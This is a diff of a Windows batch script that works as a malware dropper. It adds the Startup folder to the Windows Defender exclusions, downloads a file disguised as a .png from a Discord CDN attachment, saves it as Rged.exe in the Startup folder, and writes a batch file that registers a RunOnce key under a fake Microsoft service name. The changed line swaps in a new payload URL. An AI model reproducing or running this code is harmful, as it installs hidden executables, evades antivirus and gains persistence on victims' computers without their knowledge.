@@ -34,7 +34,7 @@ echo.>"%temp%\tmp"
 
 powershell Add-MpPreference -ExclusionPath '"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"'
 
-powershell -Command "& { Invoke-WebRequest -UseBasicParsing -Uri 'https://cdn.discordapp.com/attachments/1198398379043070123/1203360394538651738/v2.png' -OutFile \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Rged.exe\" }"
+powershell -Command "& { Invoke-WebRequest -UseBasicParsing -Uri 'https://cdn.discordapp.com/attachments/1198398379043070123/1198399286413627472/gb.png' -OutFile \"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\Rged.exe\" }"
 
 echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Rged.bat"
 echo REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "*Service Microsoft Distributed Transaction Coordinator" /t REG_SZ /d "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Rged.bat" /f >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Rged.bat"
